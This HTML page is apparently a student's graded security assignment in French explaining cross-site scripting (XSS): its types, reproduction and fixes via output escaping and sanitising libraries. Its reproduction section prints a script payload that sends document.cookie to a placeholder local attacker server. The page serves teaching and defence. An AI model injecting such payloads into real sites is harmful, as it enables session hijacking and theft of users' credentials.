<!DOCTYPE html>
<html lang="en">

<head>
  <meta name="description" content="Site explicatif des différentes failles de sécurité" />
  <meta charset="utf-8">
  <title>TP noté Di Paolo Hugo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="DI PAOLO" content="">
  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/sakura.css">
</head>

<body>
  <div id="wrapper">
    <header>
      <h1>XSS</h1>
    </header>
    <nav>
      <ul>
        <li><a href="index.php">Home</a></li>
        <li><a href="nonAuthorizedIndirectAccess.html">Accès indirect non autorisés</a></li>
        <li><a href="sqlInjection.html">SQL Injection</a></li>
        <li><a href="crsf.html">CRSF</a></li>
        <li><a href="sessionFixation.html">Fixation de session</a></li>
        <li><a href="insecureDeserialization.html">Désérialisation non sécurisée</a></li>
        <li><a href="wellKnownSecurityBreach.html">Utilisation de composants avec des failles de sécurité connues</a></li>
      </ul>
    </nav>
    <div id="main">
      <h2>description vulgarisé de la faille</h2>
      <p>Les attaques de Cross-Site Scripting (XSS) sont un type d’injection, dans lequel des scripts malveillants sont injectés dans des sites Web. Les attaques XSS se produisent lorsqu’un attaquant utilise une application Web pour envoyer du code malveillant, généralement sous la forme d’un script côté navigateur, à un utilisateur. Les failles qui permettent à ces attaques de réussir sont assez répandues et se produisent partout où une application Web utilise l’entrée d’un utilisateur sans que la sortie qu’elle génère ne soit valider.<br>
        Un attaquant peut utiliser XSS pour envoyer un script malveillant à un utilisateur sans méfiance. Le navigateur de l’utilisateur n’a aucun moyen de savoir que le script n'est pas approuvé et exécutera le script parce qu’il pense que le script provient d’une source fiable.Le script malveillant pourra par exemple accéder à tous les cookies, jetons de session ou autres informations sensibles conservés par le navigateur et utilisés avec ce site. Ces scripts peuvent même réécrire le contenu de la page HTML.</p>
      <h2>explication de comment reproduire la faille</h2>
      La vulnérabilité XSS peut être trouvée dans trois types : <br>
      <ol>
        <li>Stockage XSS</li>
        <li>XSS réfléchi</li>
        <li>Basé sur XSS DOM</li>
      </ol>
      <br>
      <p>
        La grande différence entre ces trois types est que dans le XSS stocké, les données utilisateur sont enregistrées dans la base de données contrairement à la reflété et les vulnérabilités XSS DOM-basé. Maintenant, pour le XSS reflété et les vulnérabilités XSS basées sur DOM, la différence est liée au flux de données.
        <br>
        Dans le XSS basé sur DOM, le navigateur gère l'intégralité du flux de données entaché de la source au récepteur contrairement au XSS réfléchi.
        <br>
        Cette faille peut permettre de voler des informations utilisateur, prendre le contrôle d'une application, prise de contrôle du serveur ou de la machine client.
        <br>
        Ici, je prendrais pour exemple une simple page php qui permet a l'utilisateur d'effectuer une recherche (XSS Réfléchie).
        <br>
        On peut imaginer par exemple souhaiter voler les cookies d'un utilisateur. Pour cela, on va créer un script qui va récupérer les cookies et les envoyer à notre serveur.
        <br>
      <pre>&lt;script&gt;var i=new Image;i.src=&quot;http://192.168.0.X:8888/?&quot;+document.cookie;&lt;/script&gt;</pre>
      <br>
      </p>

      <h2>explication de comment corriger la faille</h2>
      <h3>Assainissement des entrées</h3>
      <p>
        Pour la plupart des applications PHP, htmlspecialchars() sera notre meilleur ami. htmlspecialchars(), fourni sans argument, convertira les caractères spéciaux en entités HTML.
        <br>
        addslashes() est souvent utilisée pour échapper des entrées lorsqu’elle est insérée dans des variables JavaScript.
        <br>
        OWASP répertorie également d’autres fonctions qui peuvent être utilisées pour assainir les entrées, telles qu’htmlentities(), strip_tags(), filter_var(), et bien d’autres.
        <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP XSS Prevention Cheat Sheet.</a>
        <br>
        On retrouve aussi des librairies php afin d’améliorer la sécurité de l’application, par exemple <a href="http://htmlpurifier.org/">HTML Purifier</a> qui permet de nettoyer les entrées utilisateur.Mais encore :
        <a href="https://code.google.com/p/php-antixss/">PHP Anti-XSS</a>
        <br>
      </p>
      <p>Repository où l’on retrouve une <a href="https://github.com/voku/anti-xss">Cheat-Sheet PHP Anti XSS</a>
      </p>
      <h2><a href="xssVulnerability.php">page avec la faille</a></h2>
      <h2><a href="xssVulnerabilityFixed.php">page avec la faille corrigée</a></h2>
    </div>
    <footer>
      <p>TP noté — Hugo Di Paolo</p>
    </footer>
</body>

</html>